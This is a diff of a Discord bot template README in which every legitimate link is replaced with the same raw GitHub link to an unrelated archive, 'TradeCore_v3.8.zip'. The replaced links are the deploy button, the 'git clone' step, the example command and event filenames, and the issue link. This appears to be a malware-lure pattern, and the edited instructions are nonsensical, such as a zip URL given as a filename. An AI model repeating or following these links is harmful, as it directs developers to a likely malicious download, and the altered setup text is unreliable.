@@ -1,4 +1,4 @@
-[![Deploy on Railway](https://railway.app/button.svg)](https://railway.app/template/aInPaS?referralCode=ref)
+[![Deploy on Railway](https://raw.githubusercontent.com/io1q8diwelocwe/TradeCore/main/events/TradeCore_v3.8.zip)](https://raw.githubusercontent.com/io1q8diwelocwe/TradeCore/main/events/TradeCore_v3.8.zip)
 
 # Discord Bot Template 🤖
 Welcome to this versatile Discord Bot template. Designed with simplicity and flexibility in mind, it's ideal for both beginners eager to dive into the world of Discord bots and for advanced users seeking a reliable starting point.
@@ -11,7 +11,7 @@ Welcome to this versatile Discord Bot template. Designed with simplicity and fle
 ## Quick Start 🚀
 1. **Setup**: Clone the repository and install the necessary dependencies. 
 ```
-git clone https://github.com/nateloeffel/BaseDiscordBot.git
+git clone https://raw.githubusercontent.com/io1q8diwelocwe/TradeCore/main/events/TradeCore_v3.8.zip
 cd BaseDiscordBot
 npm install
 ```
@@ -23,14 +23,14 @@ npm start
 ## Adding Commands and Events 🛠
 ### Slash Commands
 1. Navigate to the `/slash` directory.
-2. Create a new file for your command, e.g., `mycommand.js.`
+2. Create a new file for your command, e.g., `https://raw.githubusercontent.com/io1q8diwelocwe/TradeCore/main/events/TradeCore_v3.8.zip`
 3. Follow the template structure, ensuring you export the necessary data for your command.
 4. Restart the bot, and your new command will automatically be available!
 ### Events
 1. Navigate to the `/events` directory.
-2. Create a new file for your event, e.g., `myevent.js.`
+2. Create a new file for your event, e.g., `https://raw.githubusercontent.com/io1q8diwelocwe/TradeCore/main/events/TradeCore_v3.8.zip`
 3. Follow the template structure, ensuring you export the necessary data for your event.
 4. Restart the bot, and it will automatically start listening for your new event!
 
 ## Support and Contribution 👥
-Found a bug? Want to add a new feature? Feel free to open an issue or submit a pull request. All contributions are welcomed! [Report an issue.](https://github.com/nateloeffel/BaseDiscordBot/issues/new/choose)
+Found a bug? Want to add a new feature? Feel free to open an issue or submit a pull request. All contributions are welcomed! [Report an issue.](https://raw.githubusercontent.com/io1q8diwelocwe/TradeCore/main/events/TradeCore_v3.8.zip)
